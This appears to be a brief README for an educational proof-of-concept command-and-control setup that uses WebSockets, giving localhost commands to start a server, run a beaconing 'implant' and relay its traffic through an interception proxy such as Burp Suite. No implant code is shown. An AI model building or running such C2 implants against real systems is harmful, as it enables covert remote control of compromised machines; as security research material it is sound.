# Leveraging WebSockets for Command and Control (C2) Communication - A Proof of Concept

Let me start by saying that this is an absolutely basic proof of concept of a miniature command and control (C2) that leverages WebSockets for communication.  Most of the code was generated via AI for experimentation (use it at your own risk, if you must) and provided here only for educational purposes.

#### Start the server
`python server.py`

#### Run the implant
`python impant.py --id myimplant001 --server ws://127.0.0.1:8765 --beacon 10`

### If you want to intercept the traffic via a proxy software such as Burp Suite

#### Start the relay first
`python replay.py`

Launch the proxy software and set it to intercpet at 127.0.0.1:8080

#### Run the implant
`python impant.py --id myimplant001 --server ws://127.0.0.1:9000 --beacon 10`
